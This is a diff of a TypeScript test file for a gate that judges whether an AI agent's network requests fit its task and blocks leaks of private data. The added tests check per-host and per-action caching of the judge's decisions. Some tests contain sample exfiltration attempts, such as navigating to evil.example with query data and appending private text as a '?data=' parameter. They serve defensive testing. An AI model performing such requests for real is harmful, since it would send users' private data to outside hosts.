@@ -558,12 +558,12 @@ describe("the purpose check", () => {
     expect((await gate().gate.check([leak("evil.example")], signal)).allow).toBe(true);
   });
 
-  it("judges a site once per task: an allowed host never asks again and a refused one asks without asking the judge", async () => {
+  it("caches exact actions while explicit task allowances cover the named host", async () => {
     const yes = judge(0.95);
     const allowed = gate({ judge: yes });
     await allowed.gate.check([leak("docs.example")], signal);
     await allowed.gate.check([leak("docs.example", "/other")], signal);
-    expect(yes.fits).toHaveBeenCalledOnce();
+    expect(yes.fits).toHaveBeenCalledTimes(2);
     const no = judge(0.1);
     const refused = gate({ judge: no });
     await refused.gate.check([leak("evil.example")], signal);
@@ -947,4 +947,26 @@ describe("asking", () => {
     h.answer("deny");
     expect(await h.run("browser_navigate", { url: "https://evil.example/c?d=1" })).toBeUndefined();
   });
+});
+
+it("does not reuse a rejected search for a different page read on the same host", async () => {
+  const j = judge();
+  j.fits.mockResolvedValueOnce(0.1).mockResolvedValueOnce(0.98);
+  const g = gate({ judge: j });
+  expect((await g.gate.check([leak("docs.example.com", "?private=value")], signal)).allow).toBe(
+    false,
+  );
+  expect((await g.gate.check([leak("docs.example.com", "/guide")], signal)).allow).toBe(true);
+  expect((await g.gate.check([leak("docs.example.com", "/guide")], signal)).allow).toBe(true);
+  expect(j.fits).toHaveBeenCalledTimes(2);
+});
+it("a read approval does not authorize sending private text to the same host", async () => {
+  const j = judge();
+  j.fits.mockResolvedValueOnce(0.98).mockResolvedValueOnce(0.1);
+  const g = gate({ judge: j });
+  expect((await g.gate.check([leak("docs.example.com", "/guide")], signal)).allow).toBe(true);
+  expect((await g.gate.check([leak("docs.example.com", `?data=${PRIVATE}`)], signal)).allow).toBe(
+    false,
+  );
+  expect(j.fits).toHaveBeenCalledTimes(2);
 });
